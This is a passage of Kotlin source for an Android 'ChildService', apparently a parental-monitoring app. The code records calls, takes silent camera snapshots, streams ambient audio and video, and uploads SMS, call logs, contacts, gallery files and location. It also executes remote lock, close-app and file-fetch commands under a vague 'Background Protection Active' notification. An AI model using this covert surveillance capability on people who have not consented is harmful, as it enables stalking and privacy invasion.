                        com.example.authapp.sync.SyncScheduler.enqueueUpload(
                            context = applicationContext,
                            file = recordedFile,
                            childId = uid,
                            streamType = if (isVideo) "video_schedule" else "scheduled",
                            durationSeconds = durationSec
                        )
                        FirebaseCrashlytics.getInstance().log("[ChildService] Scheduled recording enqueued for upload (offline-safe)")
                    }
                    scheduledStopRunnable = null
                }
                mainHandler.postDelayed(scheduledStopRunnable!!, durationMinutes * 60 * 1000L)
            }
            ACTION_START_CALL_RECORDING -> {
                val phoneNumber = intent.getStringExtra(EXTRA_PHONE_NUMBER) ?: "unknown"
                currentServiceState = "RECORDING_CALL"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "CALL_RECORDING",
                    "STARTED",
                    "Call recording initiated via foreground service for number: $phoneNumber"
                )
                updateForegroundNotification("Recording Active Call", getStreamingServiceType("audio"))
                acquireWakeLock()
                if (callRecorder == null) {
                    callRecorder = CallRecorder(applicationContext)
                }
                callRecorder?.startCallRecording(phoneNumber)
                adaptiveHeartbeatManager?.triggerImmediateHeartbeat()
            }
            ACTION_STOP_CALL_RECORDING -> {
                val durationSec = callRecorder?.recordingStartTimeMillis?.let {
                    if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                } ?: 0L
                val recordedFile = callRecorder?.stopCallRecording()
                callRecorder = null
                if (!isStreaming) releaseWakeLock()
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                adaptiveHeartbeatManager?.triggerImmediateHeartbeat()
                updateForegroundNotification("Background Protection Active", getIdleServiceType())

                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                    AppHealthTelemetry.logDiagnostic(
                        applicationContext,
                        "CALL_RECORDING",
                        "SUCCESS",
                        "Call audio captured locally (${durationSec}s, ${recordedFile.length()} bytes). Starting offline-safe Cloud sync."
                    )
                    // OFFLINE-FIRST: Net hai → direct upload, nahi → queue + WorkManager
                    com.example.authapp.sync.SyncScheduler.enqueueUpload(
                        context = applicationContext,
                        file = recordedFile,
                        childId = uid,
                        streamType = "call",
                        durationSeconds = durationSec
                    )
                    // Attach recording URL to call log when eventually uploaded (best-effort)
                    FirebaseCrashlytics.getInstance().log("[ChildService] Call recording enqueued for offline-safe upload")
                } else {
                    AppHealthTelemetry.logDiagnostic(
                        applicationContext,
                        "CALL_RECORDING",
                        "FAILED",
                        "Call recording output was empty or failed to generate file"
                    )
                }
            }
            ACTION_STOP_STREAM -> {
                stopStream()
                streamAudioRecorder?.stopRecording()
                streamAudioRecorder = null
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                updateForegroundNotification("Background Protection Active", getIdleServiceType())
            }
            ACTION_TAKE_SNAPSHOT -> {
                if (isCapturingSnapshot) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture already in progress; skipping duplicate trigger.")
                    return START_STICKY
                }
                isCapturingSnapshot = true
                val facing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                ensureOverlayWindow()
                updateForegroundNotification("Capturing Remote Photo", getSnapshotServiceType())
                startMonitoringStreamRequests()
                if (uid.isNotEmpty()) {
                    val isFront = facing.equals("front", ignoreCase = true)
                    com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                        isFront = isFront,
                        onCaptured = { file ->
                            isCapturingSnapshot = false
                            updateForegroundNotification("Background Protection Active", getIdleServiceType())
                            FirebaseRepository.uploadSnapshot(
                                childId = uid,
                                fileUri = Uri.fromFile(file),
                                cameraFacing = facing,
                                onSuccess = {
                                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
                                    try { file.delete() } catch (_: Exception) {}
                                },
                                onFailure = { err ->
                                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
                                    FirebaseRepository.reportSnapshotError(uid, err)
                                }
                            )
                        },
                        onError = { err ->
                            isCapturingSnapshot = false
                            updateForegroundNotification("Background Protection Active", getIdleServiceType())
                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                            FirebaseRepository.reportSnapshotError(uid, err)
                        }
                    )
                } else {
                    isCapturingSnapshot = false
                }
            }
            ACTION_EXECUTE_COMMAND -> {
                val cmd = intent.getStringExtra(EXTRA_COMMAND) ?: ""
                val value = intent.getStringExtra(EXTRA_COMMAND_VALUE) ?: "true"
                updateForegroundNotification("Background Protection Active", getIdleServiceType())
                startMonitoringStreamRequests()
                val effectiveUid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                executeRemoteControlCommand(effectiveUid, cmd, value)
            }
            ACTION_STOP -> {
                currentServiceState = "STOPPED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                stopStream()
                callRecorder?.stopCallRecording()
                callRecorder = null
                streamAudioRecorder?.stopRecording()
                streamAudioRecorder = null
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
            else -> {
                val effectiveUid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                val isUserLoggedIn = FirebaseRepository.currentUser != null || effectiveUid.isNotEmpty()
                if (!isUserLoggedIn) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] No user logged in. Terminating service.")
                    stopStream()
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                    return START_NOT_STICKY
                }

                updateForegroundNotification("Background Protection Active", getIdleServiceType())
                startMonitoringStreamRequests()
            }
        }
        return START_STICKY
    }

    private fun startMonitoringStreamRequests() {
        val uid = FirebaseRepository.currentUser?.uid?.takeIf { it.isNotEmpty() }
            ?: AppPreferences.getUserId(applicationContext).takeIf { it.isNotEmpty() }

        if (uid.isNullOrEmpty()) {
            FirebaseCrashlytics.getInstance().log("[ChildService] User signed out or not found. Stopping background service.")
            stopStream()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }
        FirebaseRepository.setupPresenceSystem(uid)

        // Remote Recording Listener (Parent clicks 'Record' on remote stream)
        if (streamRecordingListener == null) {
            streamRecordingListener = FirebaseRepository.listenToRemoteRecording(uid) { isRecording, recType ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Remote recording command: isRecording=$isRecording, type=$recType")
                if (isRecording) {
                    if (streamAudioRecorder == null) {
                        streamAudioRecorder = StreamAudioRecorder(applicationContext)
                    }
                    streamAudioRecorder?.startRecording(recType)
                } else {
                    val durationSec = streamAudioRecorder?.recordingStartTimeMillis?.let {
                        if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                    } ?: 0L
                    val recordedFile = streamAudioRecorder?.stopRecording()
                    streamAudioRecorder = null
                    if (recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                        // OFFLINE-FIRST: Net hai toh direct upload, nahi toh queue
                        com.example.authapp.sync.SyncScheduler.enqueueUpload(
                            context = applicationContext,
                            file = recordedFile,
                            childId = uid,
                            streamType = recType,
                            durationSeconds = durationSec
                        )
                        FirebaseCrashlytics.getInstance().log("[ChildService] Remote stream recording enqueued (offline-safe)")
                    }
                }
            }
        }

        // SIM Change Detection (Phase 2)
        com.example.authapp.security.SimChangeDetector.checkSimChange(applicationContext, uid)

        // Sync Call Logs (Phase 2)
        try {
            val callLogs = com.example.authapp.utils.CallLogUtils.getRecentCallLogs(applicationContext, limit = 30)
            if (callLogs.isNotEmpty()) {
                FirebaseRepository.syncCallLogs(uid, callLogs)
            }
        } catch (_: Exception) {}

        // Listen for Remote Snapshot requests (Phase 1)
        if (snapshotRequestListener == null) {
            snapshotRequestListener = FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
                if (webRtcManager != null) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested while WebRTC video stream active; rejecting request")
                    FirebaseRepository.reportSnapshotError(uid, "Camera hardware is currently in use by active live stream")
                    return@listenToSnapshotRequest
                }
                if (isCapturingSnapshot) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested while already capturing; rejecting duplicate")
                    return@listenToSnapshotRequest
                }
                isCapturingSnapshot = true
                ensureOverlayWindow()
                updateForegroundNotification("Capturing Remote Photo", getSnapshotServiceType())
                val isFront = cameraFacing.equals("front", ignoreCase = true)
                com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                    isFront = isFront,
                    onCaptured = { file ->
                        isCapturingSnapshot = false
                        updateForegroundNotification("Background Protection Active", getIdleServiceType())
                        FirebaseRepository.uploadSnapshot(
                            childId = uid,
                            fileUri = Uri.fromFile(file),
                            cameraFacing = cameraFacing,
                            onSuccess = {
                                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
                                try { file.delete() } catch (_: Exception) {}
                            },
                            onFailure = { err ->
                                FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
                                FirebaseRepository.reportSnapshotError(uid, err)
                            }
                        )
                    },
                    onError = { err ->
                        isCapturingSnapshot = false
                        updateForegroundNotification("Background Protection Active", getIdleServiceType())
                        FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                        FirebaseRepository.reportSnapshotError(uid, err)
                    }
                )
            }
        }

        // Listen for Recording Schedules (Phase 1)
        if (recordingScheduleListener == null) {
            var previousScheduleIds = emptySet<String>()
            recordingScheduleListener = FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
                val currentIds = schedules.map { it.id }.toSet()
                // Cancel alarms for schedules that were deleted from Firebase
                val deletedIds = previousScheduleIds - currentIds
                for (deletedId in deletedIds) {
                    com.example.authapp.scheduler.RecordingScheduler.cancelSchedule(applicationContext, deletedId)
                    FirebaseCrashlytics.getInstance().log("[ChildService] Cancelled deleted schedule alarm: $deletedId")
                }
                previousScheduleIds = currentIds
                // Set/update alarms for current schedules
                for (schedule in schedules) {
                    com.example.authapp.scheduler.RecordingScheduler.setSchedule(applicationContext, schedule)
                }
            }
        }

        // Listen for Parent Controls & Study Mode Freeze (Phase 3)
        if (parentControlsListener == null) {
            parentControlsListener = FirebaseRepository.listenToParentControls(uid) { settings ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Parent controls received: studyMode=${settings.isStudyModeActive}, blockedCount=${settings.blockedPackages.size}")
                updateStudyModeOverlay(settings.isStudyModeActive, settings.studyModeMessage)
                val activeBlocked = settings.blockedPackages.filterValues { it }.keys
                com.example.authapp.service.ChildAccessibilityService.blockedPackageNames = activeBlocked.toSet()
            }
        }

        // Listen for Geofence Zones (Phase 4)
        if (geofencesListener == null) {
            geofencesListener = FirebaseRepository.listenToGeofences(uid) { zones ->
                activeGeofences = zones
            }
        }

        // Listen for Remote Hardware & App Commands (Phase 4)
        if (remoteCommandsListener == null) {
            // Clear any stale close app commands so child device is never trapped in a home kickback loop
            try {
                com.google.firebase.database.FirebaseDatabase.getInstance().reference
                    .child("commands").child(uid).child("CLOSE_APP").removeValue()
                com.google.firebase.database.FirebaseDatabase.getInstance().reference
                    .child("commands").child(uid).child("STOP_APP").removeValue()
            } catch (_: Exception) {}
            remoteCommandsListener = FirebaseRepository.listenToRemoteCommands(uid) { command, value ->
                executeRemoteControlCommand(uid, command, value)
            }
        }

        // Asynchronous Background Sync (Phase 4): Never block Main UI thread!
        serviceScope.launch(kotlinx.coroutines.Dispatchers.IO) {
            // Sync SMS Messages
            try {
                val smsList = com.example.authapp.utils.SmsUtils.getRecentSms(applicationContext, limit = 30)
                if (smsList.isNotEmpty()) {
                    FirebaseRepository.syncSmsLogs(uid, smsList)
                }
            } catch (_: Exception) {}

            // Check for newly added contacts
            try {
                com.example.authapp.utils.ContactsMonitor.checkNewContacts(applicationContext, uid)
            } catch (_: Exception) {}

            // Sync Gallery & File Explorer metadata (Single unified scan)
            try {
                com.example.authapp.utils.MediaGalleryUtils.scanAndSyncMediaGallery(applicationContext, uid)
                com.example.authapp.utils.FileManagerUtils.scanAndSyncFileExplorer(applicationContext, uid)
            } catch (_: Exception) {}

            // Auto-Prune: Purge logs older than 7 days to keep Firebase Storage & Bandwidth 100% FREE
            try {
                FirebaseRepository.pruneOldLogs(uid, retentionDays = 7)
            } catch (_: Exception) {}

            // Sync real-time App Usage to Firebase
            syncAppUsageStats(uid)

            // Sync Installed Apps to package_events (Apps Tab)
            syncInstalledApps(uid)
        }

        // Register Real-time MediaStore ContentObserver for auto-detecting new photos
        registerMediaObserver(uid)

        // Start GPS Location tracking & Offline caching
        startLocationMonitoring()
        registerNetworkCallback(uid)
        startPermissionShieldGuard(uid)
        registerTelephonyCallStateListener(uid)

        if (streamRequestListener != null) return

        FirebaseCrashlytics.getInstance().log("[ChildService] Listening to RTDB stream requests for: $uid")
        streamRequestListener = FirebaseRepository.listenToStreamRequests(
            childId = uid,
            onRequested = { streamType, sessionId ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Stream request received over RTDB: $streamType, session: $sessionId")
                if ((isStreaming || isStartingStream) && currentSessionId == sessionId) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId already active/starting; ignoring duplicate onRequested.")
                    return@listenToStreamRequests
                }
                if (System.currentTimeMillis() - lastStreamStartTime < 4000L && lastStartedSessionId == sessionId) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Stream session $sessionId requested within 4s window; ignoring duplicate onRequested.")
                    return@listenToStreamRequests
                }
                if (!isStreaming || currentSessionId != sessionId) {
                    if (streamType.equals("audio", ignoreCase = true)) {
                        // Senior Dev Architecture: Direct Ambient Audio Streaming (Zero WebRTC handshake failures)
                        try {
                            val serviceType = getStreamingServiceType(streamType)
                            updateForegroundNotification("Active Ambient Audio Stream", serviceType)
                            acquireWakeLock()
                            adaptiveHeartbeatManager?.setStreamingState(true)
                            isStreaming = true
                            currentSessionId = sessionId

                            ambientAudioStreamer?.stopStreaming(uid)
                            val streamer = com.example.authapp.audio.AmbientAudioStreamer(applicationContext)
                            ambientAudioStreamer = streamer
                            streamer.startStreaming(
                                childId = uid,
                                onStarted = {
                                    FirebaseRepository.updateStreamStatus(uid, "STREAMING", streamType, sessionId)
                                    FirebaseCrashlytics.getInstance().log("[ChildService] AmbientAudioStreamer active and streaming")
                                },
                                onError = { err ->
                                    FirebaseCrashlytics.getInstance().log("[ChildService] AmbientAudioStreamer error: $err")
                                    FirebaseRepository.updateStreamStatus(uid, "FAILED", streamType, sessionId)
                                    stopStream()
                                }
                            )
                        } catch (e: Exception) {
                            FirebaseCrashlytics.getInstance().log("[ChildService] AmbientAudioStreamer launch error: ${e.localizedMessage}")
                        }
                    } else if (streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)) {
                        val promptIntent = Intent(this, com.example.authapp.ui.activity.ScreenCapturePromptActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            putExtra(EXTRA_SESSION_ID, sessionId)
                        }
                        startActivity(promptIntent)
                    } else {
                        // Live Video + Audio
                        if (streamType.equals("video", ignoreCase = true)) {
                            ensureOverlayWindow()
                        }
                        try {
                            val serviceType = getStreamingServiceType(streamType)
                            updateForegroundNotification("Active Remote Stream ($streamType)", serviceType)
                            startWebRtcStream(sessionId, streamType)
                        } catch (e: SecurityException) {
                            FirebaseCrashlytics.getInstance().log("[ChildService] SecurityException on stream start (Android 14 policy): ${e.localizedMessage}")
                            FirebaseRepository.updateStreamStatus(uid, "FAILED", streamType, sessionId)
                            stopStream()
                        } catch (e: Exception) {
                            FirebaseCrashlytics.getInstance().log("[ChildService] startForeground stream error: ${e.localizedMessage}")
                        }
                    }
                }
            },
            onStopped = {
                FirebaseCrashlytics.getInstance().log("[ChildService] Remote stream stopped by Parent")
                stopStream()
                updateForegroundNotification("Background Protection Active", getIdleServiceType())
            }
        )
    }

    private fun startWebRtcStream(sessionId: String, streamType: String, projectionData: Intent? = null) {
        synchronized(this) {
            if ((isStreaming || isStartingStream) && currentSessionId == sessionId) {
                FirebaseCrashlytics.getInstance().log("[ChildService] startWebRtcStream duplicate ignored for $sessionId")
                return
            }
            if (System.currentTimeMillis() - lastStreamStartTime < 4000L && lastStartedSessionId == sessionId) {
                FirebaseCrashlytics.getInstance().log("[ChildService] startWebRtcStream 4s debounce ignored for $sessionId")
                return
            }
        }

        // Clean up previous stream safely WITHOUT deleting the new session!
        if (isStreaming || webRtcManager != null) {
            stopStream()
        }

        synchronized(this) {
            lastStreamStartTime = System.currentTimeMillis()
            lastStartedSessionId = sessionId
            isStartingStream = true
            currentSessionId = sessionId
            isStreaming = true
        }
        acquireWakeLock()
        adaptiveHeartbeatManager?.setStreamingState(true)

        // Update RTDB to STREAMING so parent reconnecting sees the active session
        val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
        if (uid.isNotEmpty()) {
            try {
                FirebaseRepository.updateStreamStatus(uid, "STREAMING", streamType, sessionId)
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] STREAMING status update failed: ${e.localizedMessage}")
            }
        }

        if (streamType.equals("video", ignoreCase = true)) {
            ensureOverlayWindow()
        }

        try {
            // Configure hardware microphone routing for WebRTC
            try {
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
                // Broadcaster MUST stay in MODE_NORMAL so local media playback (YouTube, music)
                // and loudspeaker are NEVER suppressed or redirected to earpiece
                audioManager?.mode = AudioManager.MODE_NORMAL
                audioManager?.isMicrophoneMute = false
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] AudioManager mode error: ${e.localizedMessage}")
            }

            webRtcManager = WebRtcManager(applicationContext)
            candidateBatcher = com.example.authapp.webrtc.CandidateBatcher(sessionId, isParent = false)
            FirebaseRepository.fetchIceServers { iceServers ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Starting WebRTC stream ($streamType) with ${iceServers.size} ICE servers for session: $sessionId")

                webRtcManager?.startStream(
                    streamType = streamType,
                    iceServers = iceServers,
                    mediaProjectionData = projectionData,
                    onIceCandidate = { candidate ->
                        candidateBatcher?.addCandidate(candidate)
                    },
                    onSdpCreated = { sdp ->
                        isStartingStream = false
                        FirebaseCrashlytics.getInstance().log("[ChildService] Sending SDP Offer to RTDB")
                        FirebaseRepository.sendSdpOffer(sessionId, sdp.description)
                    }
            )

            // 1. Listen for SDP Answer from Parent
            sdpAnswerListener = FirebaseRepository.listenToSdpAnswer(sessionId) { sdpAnswer ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Received SDP Answer from Parent")
                webRtcManager?.setRemoteAnswer(sdpAnswer)
            }

            // 2. Listen for Parent ICE candidates
            parentCandidateListener = FirebaseRepository.listenToCandidates(sessionId, listenToParentCandidates = true) { sdpMid, sdpMLineIndex, sdp ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Received Parent ICE Candidate")
                webRtcManager?.addRemoteCandidate(sdpMid, sdpMLineIndex, sdp)
            }

            // 3. Listen for Camera Flip / Ultra-Wide requests
            cameraFacingListener = FirebaseRepository.listenToCameraFacingMode(sessionId) { facingMode ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Camera switch requested: mode=$facingMode")
                webRtcManager?.switchCameraMode(facingMode)
            }
            } // end fetchIceServers
        } catch (t: Throwable) {
            isStartingStream = false
            FirebaseCrashlytics.getInstance().recordException(t)
            AppHealthTelemetry.logDiagnostic(applicationContext, "WEBRTC_STREAM", "FAILED", "Failed to start WebRTC stream on child: ${t.localizedMessage}", t.message)
            stopStream()
        }
    }

    private fun executeRemoteControlCommand(uid: String, command: String, value: Any?) {
        val effectiveUid = uid.ifEmpty { AppHealthTelemetry.getEffectiveUserId(applicationContext) }
        when (command) {
            "TORCH" -> {
                val enable = value == true || value == "true"
                RemoteActionsManager.setTorch(applicationContext, enable)
            }
            "SIREN" -> {
                val enable = value == true || value == "true"
                if (enable) {
                    RemoteActionsManager.playSiren(applicationContext, 30) {
                        try {
                            FirebaseControlRepository.sendRemoteCommand(effectiveUid, "SIREN", false)
                        } catch (_: Exception) {}
                    }
                } else {
                    RemoteActionsManager.stopSiren()
                }
            }
            "LOCK" -> {
                val enable = value == true || value == "true"
                if (enable) {
                    RemoteActionsManager.lockDevice(applicationContext)
                    try {
                        FirebaseControlRepository.sendRemoteCommand(effectiveUid, "LOCK", false)
                    } catch (_: Exception) {}
                }
            }
            "OPEN_APP", "LAUNCH_APP" -> {
                val pkg = value?.toString()?.trim() ?: ""
                if (pkg.isNotEmpty()) {
                    try {
                        val pm = applicationContext.packageManager
                        val launchIntent = pm.getLaunchIntentForPackage(pkg)?.apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
                        }
                        if (launchIntent != null) {
                            applicationContext.startActivity(launchIntent)
                            FirebaseCrashlytics.getInstance().log("[ChildService] Remotely launched app: $pkg")
                        } else {
                            FirebaseCrashlytics.getInstance().log("[ChildService] Launch intent not found for: $pkg")
                        }
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildService] Remote open app error: ${e.localizedMessage}")
                    }
                    try {
                        FirebaseControlRepository.sendRemoteCommand(effectiveUid, "OPEN_APP", "")
                    } catch (_: Exception) {}
                }
            }
            "CLOSE_APP", "STOP_APP" -> {
                val pkg = value?.toString()?.trim() ?: ""
                // Critical: Only execute if package is explicitly specified (not empty, cleared, or false)
                if (pkg.isNotEmpty() && pkg != "false" && pkg != "null") {
                    try {
                        // 1. Accessibility Service se Home Screen par bhejo (instantly dismiss foreground app)
                        val acc = com.example.authapp.service.ChildAccessibilityService.instance
                        if (acc != null) {
                            acc.returnToHomeScreen()
                        } else {
                            // Fallback: Launch Home category intent
                            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                                addCategory(Intent.CATEGORY_HOME)
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            }
                            applicationContext.startActivity(homeIntent)
                        }

                        // 2. Kill background process for package (never kill self!)
                        if (pkg != "ALL" && pkg != "true" && pkg != applicationContext.packageName) {
                            val am = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
                            am?.killBackgroundProcesses(pkg)
                        }
                        FirebaseCrashlytics.getInstance().log("[ChildService] Remotely closed app: $pkg")
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildService] Remote close app error: ${e.localizedMessage}")
                    }
                    try {
                        com.google.firebase.database.FirebaseDatabase.getInstance().reference
                            .child("commands").child(effectiveUid).child("CLOSE_APP").removeValue()
                        com.google.firebase.database.FirebaseDatabase.getInstance().reference
                            .child("commands").child(effectiveUid).child("STOP_APP").removeValue()
                    } catch (_: Exception) {}
                }
            }
            "SYNC_MEDIA" -> {
                val enable = value == true || value == "true"
                if (enable) {
                    serviceScope.launch(kotlinx.coroutines.Dispatchers.IO) {
                        try {
                            com.example.authapp.utils.MediaGalleryUtils.scanAndSyncMediaGallery(applicationContext, effectiveUid)
                            com.example.authapp.utils.FileManagerUtils.scanAndSyncFileExplorer(applicationContext, effectiveUid)
                            syncInstalledApps(effectiveUid)
                        } catch (e: Exception) {
                            FirebaseCrashlytics.getInstance().log("[ChildService] Media/File sync error: ${e.localizedMessage}")
                        }
                    }
                    try {
                        FirebaseControlRepository.sendRemoteCommand(effectiveUid, "SYNC_MEDIA", false)
                    } catch (_: Exception) {}
                }
            }
            "UNINSTALL_APP" -> {
                val pkg = value?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    try {
                        val deleteIntent = Intent(Intent.ACTION_DELETE).apply {
                            data = Uri.parse("package:$pkg")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        applicationContext.startActivity(deleteIntent)
                        FirebaseControlRepository.sendRemoteCommand(effectiveUid, "UNINSTALL_APP", "")
                    } catch (_: Exception) {}
                }
            }
            "BLOCK_APP" -> {
                val pkg = value?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    FirebaseRepository.setAppBlocked(effectiveUid, pkg, true)
                    FirebaseControlRepository.sendRemoteCommand(effectiveUid, "BLOCK_APP", "")
                }
            }
            "UNBLOCK_APP" -> {
                val pkg = value?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    FirebaseRepository.setAppBlocked(effectiveUid, pkg, false)
                    FirebaseControlRepository.sendRemoteCommand(effectiveUid, "UNBLOCK_APP", "")
                }
            }
            "FETCH_MEDIA" -> {
                val path = value?.toString() ?: ""
                if (path.isNotEmpty()) {
                    try {
                        val file = java.io.File(path)
                        if (file.exists() && file.isFile) {
                            val thumb = com.example.authapp.utils.MediaGalleryUtils.getMicroThumbnailBase64(
                                context = applicationContext,
                                id = 0L,
                                path = file.absolutePath
                            )
                            val mediaItem = com.example.authapp.data.MediaGalleryItem(
                                id = System.currentTimeMillis().toString(),
                                fileName = file.name,
                                filePath = file.absolutePath,
                                fileType = "IMAGE",
                                sizeBytes = file.length(),
                                dateAdded = file.lastModified(),
                                thumbnailBase64 = thumb
                            )
                            FirebaseRepository.pushMediaGalleryItem(effectiveUid, mediaItem)

                            com.example.authapp.sync.SyncScheduler.enqueueUpload(
                                context = applicationContext,
                                file = file,
                                childId = effectiveUid,
                                streamType = "gallery_photo",
                                durationSeconds = 0L
                            )
                        }
                        FirebaseControlRepository.sendRemoteCommand(effectiveUid, "FETCH_MEDIA", "")
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun stopStream() {
        scheduledStopRunnable?.let { mainHandler.removeCallbacks(it) }
        scheduledStopRunnable = null
        val oldSessionId = currentSessionId
        isStreaming = false
        isStartingStream = false
        currentSessionId = null

        if (!oldSessionId.isNullOrEmpty()) {
            sdpAnswerListener?.let {
                FirebaseRepository.removeSdpAnswerListener(oldSessionId, it)
            }
            parentCandidateListener?.let {
                FirebaseRepository.removeCandidateListener(oldSessionId, listenToParentCandidates = true, it)
            }
            cameraFacingListener?.let {
                FirebaseRepository.removeCameraFacingListener(oldSessionId, it)
            }
            FirebaseRepository.deleteSignalingSession(oldSessionId)
        }
        candidateBatcher?.flush()
        candidateBatcher?.clear()
        candidateBatcher = null

        sdpAnswerListener = null
        parentCandidateListener = null
        cameraFacingListener = null

        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.mode = AudioManager.MODE_NORMAL
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] audioManager reset error: ${e.localizedMessage}")
        }
        try {
            webRtcManager?.stopStream()
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
        webRtcManager = null

        try {
            val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
            ambientAudioStreamer?.stopStreaming(uid)
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
        ambientAudioStreamer = null

        releaseWakeLock()
        adaptiveHeartbeatManager?.setStreamingState(false)
        removeOverlayWindow()
    }

    private fun isNetworkConnected(): Boolean {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return false
            val activeNet = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(activeNet) ?: return false
            caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (_: Exception) {
            true
        }
    }

    private fun registerNetworkCallback(uid: String) {
        // BUG FIX: startNetworkRestoreSync() already networkCallback register kar deta hai onCreate mein
        // Yahan sirf location flush karne ke liye hook karo — naya callback mat banao duplicate ban jaata tha
        if (uid.isEmpty()) return
        // Agar pehle se networkCallback registered hai (startNetworkRestoreSync se), sirf location flush ensure karo
        if (networkCallback != null) {
            FirebaseCrashlytics.getInstance().log("[ChildService] registerNetworkCallback: callback already registered via startNetworkRestoreSync, skipping duplicate")
            // Offline cache abhi flush karo agar net connected hai
            if (isNetworkConnected()) {
                com.example.authapp.utils.OfflineLocationCache.flushCachedLocations(applicationContext, uid)
            }
            return
        }
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return
            val request = android.net.NetworkRequest.Builder()
                .addCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            networkCallback = object : android.net.ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] Network restored. Flushing offline cached locations for $uid")
                    com.example.authapp.utils.OfflineLocationCache.flushCachedLocations(applicationContext, uid)
                    // Also trigger pending upload sync
                    if (!com.example.authapp.sync.PendingUploadQueue.isEmpty(applicationContext)) {
                        com.example.authapp.sync.SyncScheduler.scheduleWorker(applicationContext)
                    }
                }
            }
            cm.registerNetworkCallback(request, networkCallback!!)
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] registerNetworkCallback error: ${e.localizedMessage}")
        }
    }

    private fun startPermissionShieldGuard(uid: String) {
        if (uid.isEmpty() || permissionShieldHandler != null) return
        permissionShieldHandler = android.os.Handler(android.os.Looper.getMainLooper())
        var lastOverlay = hasOverlayPermission()
        var lastLoc = hasLocationPermission()
        var lastMic = hasMicrophonePermission()
        var lastCam = hasCameraPermission()

        permissionShieldRunnable = object : Runnable {
            override fun run() {
                try {
                    val currOverlay = hasOverlayPermission()
                    val currLoc = hasLocationPermission()
                    val currMic = hasMicrophonePermission()
                    val currCam = hasCameraPermission()

                    if (lastOverlay && !currOverlay) {
                        FirebaseRepository.pushSecurityAlert(
                            uid,
                            com.example.authapp.data.SecurityAlert(
                                type = "PERMISSION_REVOKED",
                                title = "⚠️ Critical: Overlay Permission Revoked",
